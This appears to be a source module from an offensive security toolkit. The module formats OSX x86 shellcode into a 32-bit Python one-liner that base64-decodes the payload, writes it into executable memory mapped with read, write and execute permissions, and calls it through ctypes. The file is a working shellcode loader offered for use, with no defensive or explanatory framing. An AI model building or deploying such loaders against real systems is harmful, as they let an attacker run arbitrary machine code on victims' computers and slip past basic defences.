from lets.module import Module

# Imports required to execute this module
import base64


class Python(Module):
    """
    Format OSX x86 shellcode into python code, for use with 32-bit cpython.
    """

    def usage(self) -> object:
        """
        Configure an ArgumentParser object with options relevant to the module.

        :return: ArgumentParser object
        """
        parser = super().usage()

        return parser

    def do(self, data:bytes=None, options:dict=None) -> bytes:
        """
        Main functionality.

        Module.do updates self.options with options.

        :param data: Data to be used by module, in bytes
        :param options: Dict of options to be used by module
        :return: Generator containing results of module execution, in bytes
        """
        super().do(data, options)

        # Validate input
        try:
            assert data, "Expecting data"
        except AssertionError as e:
            self.throw(e)

        # Encode command
        encoded = base64.b64encode(data)
        self.options["encoded"] = encoded.decode()

        # Place encoded command in harness
        cmd = ("import sys,base64,ctypes,mmap,struct;"+

            # Get architecture
            "p=ctypes.sizeof(ctypes.c_void_p);"+

            # If 32-bit python, decode payload
            "c=base64.b64decode('%(encoded)s') if p==4 else sys.exit(1);"+

            # Allocate anonymous private RWX memory
            "m=mmap.mmap(-1,len(c),mmap.MAP_PRIVATE,mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC);"+

            # Write payload to allocated memory
            "m.write(c);"+

            # Get address of allocated memory
            "a=struct.unpack('<I',ctypes.string_at(id(m)+2*p,p))[0];"+

            # Cast address as python function
            "f=ctypes.cast(a,ctypes.CFUNCTYPE(ctypes.c_void_p));"+

            # Call function
            "f();"
            ) % self.options


        # Convert harness to bytes and return
        yield cmd.encode()

    def test(self):
        """
        Perform unit tests to verify this module's functionality.
        """
